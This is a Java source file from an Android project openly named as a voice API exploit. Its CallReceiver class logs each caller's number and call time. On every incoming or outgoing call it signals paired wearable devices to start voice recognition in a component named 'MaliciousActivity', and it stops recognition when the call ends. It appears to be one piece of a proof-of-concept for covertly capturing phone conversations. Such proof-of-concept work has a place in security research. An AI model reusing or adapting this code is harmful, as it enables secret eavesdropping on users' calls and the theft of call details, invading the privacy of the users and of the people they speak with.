package com.alexey_reznik.voice_api_exploit;

import android.content.Context;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.util.Log;

import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.common.api.ResultCallback;
import com.google.android.gms.wearable.Node;
import com.google.android.gms.wearable.NodeApi;
import com.google.android.gms.wearable.Wearable;

import java.util.Date;

public class CallReceiver extends PhonecallReceiver {
    public static final String LOG_TAG = "CallReceiver";
    public static final String OUTGOING = "Outgoing";
    public static final String INCOMING = "Incoming";
    public static final String SYS_PREF_CALLINFO = "call_info";
    public static final String START_RECOGNITION = "startRegognition";
    public static final String STOP_RECOGNITION = "stopRecognition";

    private PhonecallReceiver callReceiver;
    private GoogleApiClient googleApiClient;

    @Override
    protected void onIncomingCallStarted(Context ctx, String number, Date start) {
        super.onIncomingCallStarted(ctx, number, start);
        Log.d(LOG_TAG, "onIncomingCallStarted");
        storeCallInfo(INCOMING,ctx, number, start);
        startVoiceRecognition(ctx);
    }

    @Override
    protected void onOutgoingCallStarted(Context ctx, String number, Date start) {
        super.onOutgoingCallStarted(ctx, number, start);
        Log.d(LOG_TAG, "onOutgoingCallStarted");
        storeCallInfo(OUTGOING, ctx, number, start);
        startVoiceRecognition(ctx);
    }

    private void storeCallInfo(String type, Context ctx, String number, Date start) {
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(ctx);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString(SYS_PREF_CALLINFO, "New call\n Type: "
                + type + "\nNumber: " + number + "\nStarting date: " + start.toString());
        editor.commit();
    }

    @Override
    protected void onIncomingCallEnded(Context ctx, String number, Date start, Date end) {
        super.onIncomingCallEnded(ctx, number, start, end);
        Log.d(LOG_TAG, "onIncomingCallEnded");
        stopVoiceRecognition(ctx);
    }

    @Override
    protected void onOutgoingCallEnded(Context ctx, String number, Date start, Date end) {
        super.onOutgoingCallEnded(ctx, number, start, end);
        Log.d(LOG_TAG, "onOutgoingCallEnded");
        stopVoiceRecognition(ctx);
    }

    @Override
    protected void onMissedCall(Context ctx, String number, Date start) {
        super.onMissedCall(ctx, number, start);
        Log.d(LOG_TAG, "onMissedCall");
        stopVoiceRecognition(ctx);
    }



    private void startVoiceRecognition(Context ctx) {
        googleApiClient = new GoogleApiClient.Builder(ctx)
                .addApi(Wearable.API)
                .build();

        googleApiClient.connect();
        com.google.android.gms.common.api.PendingResult<NodeApi.GetConnectedNodesResult> nodes
                = Wearable.NodeApi.getConnectedNodes(googleApiClient);
        nodes.setResultCallback(new ResultCallback<NodeApi.GetConnectedNodesResult>() {
            @Override
            public void onResult(NodeApi.GetConnectedNodesResult result) {
                for (int i = 0; i < result.getNodes().size(); i++) {
                    Node node = result.getNodes().get(i);
                    String nName = node.getDisplayName();
                    String nId = node.getId();
                    Log.d(LOG_TAG, "sending START_RECOGNITION message");
                    Wearable.MessageApi.sendMessage(googleApiClient, node.getId(),
                            "com.example.voice_recognition_exploit.MaliciousActivity",
                            START_RECOGNITION.getBytes());
                }
            }
        });

    }

    private void stopVoiceRecognition(Context ctx) {
        googleApiClient = new GoogleApiClient.Builder(ctx)
                .addApi(Wearable.API)
                .build();

        googleApiClient.connect();
        com.google.android.gms.common.api.PendingResult<NodeApi.GetConnectedNodesResult> nodes
                = Wearable.NodeApi.getConnectedNodes(googleApiClient);
        nodes.setResultCallback(new ResultCallback<NodeApi.GetConnectedNodesResult>() {
            @Override
            public void onResult(NodeApi.GetConnectedNodesResult result) {
                for (int i = 0; i < result.getNodes().size(); i++) {
                    Node node = result.getNodes().get(i);
                    String nName = node.getDisplayName();
                    String nId = node.getId();
                    Log.d(LOG_TAG, "sending STOP_RECOGNITION message");
                    Wearable.MessageApi.sendMessage(googleApiClient, node.getId(),
                            "com.example.voice_recognition_exploit.MaliciousActivity",
                            STOP_RECOGNITION.getBytes());
                }
            }
        });

    }

}
